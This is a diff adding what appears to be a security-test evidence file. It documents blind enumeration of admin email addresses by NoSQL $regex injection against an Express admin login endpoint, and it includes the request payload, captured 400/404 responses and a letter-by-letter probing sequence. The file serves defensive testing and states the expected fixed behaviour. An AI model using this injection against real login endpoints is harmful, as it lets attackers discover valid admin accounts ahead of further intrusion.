@@ -1,0 +1,35 @@
+# NoSQL-2 blind admin-email enumeration via $regex (admin login oracle)
+# Attempted: POST /api/admins/login with email={$regex:'^<prefix>'} — 400 means an admin with that prefix EXISTS, 404 means none
+# Expected when fixed: Same generic error regardless of whether the account exists; no operators accepted
+
+## prefix "^legit" (matches legit_admin@example.com) -> 400 (EXISTS):
+HTTP/1.1 400 Bad Request
+X-Powered-By: Express
+Access-Control-Allow-Origin: *
+Content-Type: application/json; charset=utf-8
+Content-Length: 55
+ETag: W/"37-5uDpJTljPBecOPs/j7OXFdPRcmQ"
+Date: Sun, 27 Sep 2026 07:38:56 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+{"success":false,"message":"Invalid email or password"}
+
+## prefix "^zzzznope" (matches nothing) -> 404 (NONE):
+HTTP/1.1 404 Not Found
+X-Powered-By: Express
+Access-Control-Allow-Origin: *
+Content-Type: application/json; charset=utf-8
+Content-Length: 45
+ETag: W/"2d-FezyxQoqiOzVY7d+OV7+z/8ytpE"
+Date: Sun, 27 Sep 2026 07:38:56 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+{"success":false,"message":"Admin not found"}
+
+## walking the alphabet (first char) — 400 reveals a real first letter:
+  ^a -> 400
+  ^b -> 404
+  ^l -> 400
+  ^z -> 404
